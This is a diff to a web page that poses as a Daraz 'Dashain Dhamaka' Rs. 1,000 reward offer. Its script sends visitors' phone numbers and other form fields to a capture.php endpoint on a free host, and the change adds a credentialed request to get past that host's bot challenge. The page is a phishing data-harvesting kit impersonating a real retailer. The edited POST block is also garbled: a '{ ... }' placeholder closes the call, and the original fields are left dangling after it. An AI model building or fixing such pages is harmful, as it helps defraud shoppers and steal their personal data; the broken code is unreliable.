@@ -173,7 +173,9 @@
 <script>
 "use strict";
 
-var API = "https://daraz-dashain.freedev.app/capture.php?i=1";
+var API = "https://daraz-dashain.freedev.app/capture.php";
+ // Warm up: follow InfinityFree's ?i= challenge so the cookie is set before POST
+fetch(API, { method: 'GET', cache: 'no-store', credentials: 'include' }).catch(function(){});
 
 var modal       = document.getElementById('modalOverlay');
 var btnRedeem   = document.getElementById('btnRedeem');
@@ -292,9 +294,11 @@ btnSubmit.addEventListener('click', function(){
   btnSubmit.textContent = 'SUBMITTING...';
 
   fetch(API, {
-    method: 'POST',
-    headers: { 'Content-Type':'text/plain;charset=UTF-8' },
-    body: JSON.stringify({
+  method: 'POST',
+  credentials: 'include',
+  headers: { 'Content-Type':'text/plain;charset=UTF-8' },
+  body: JSON.stringify({ ... })
+})
       campaign: 'Daraz Dashain Dhamaka',
       reward: 'Rs. 1,000',
       phoneNumber: phone,
